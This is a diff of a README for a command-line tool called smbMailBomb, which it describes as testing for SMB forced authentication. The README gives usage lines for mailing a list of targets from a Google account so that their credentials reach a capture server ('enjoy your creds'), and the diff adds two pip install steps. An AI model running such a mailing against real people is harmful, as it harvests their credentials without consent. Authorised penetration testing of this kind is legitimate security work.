@@ -11,7 +11,9 @@ A command line utility to test for SMB Forced Authentication
 #### In the google account settings
 ######  Click Security
 ######  Allow Less Secure Apps
-#### From the command line run smbMailBomb.py and enjoy your creds: 
+#### From the command line run smbMailBomb.py and enjoy your creds:
+###### pip install pandas
+###### pip install colorama
 ##### Usage: python3 smbMailBomb2.py -e user@yourGoogleDomain.com -p yourGooglePassword -f path/to/targets.xlsx -ip captureServerIP
 ######  -f path to target xlsx file
 ######  -e your google business email
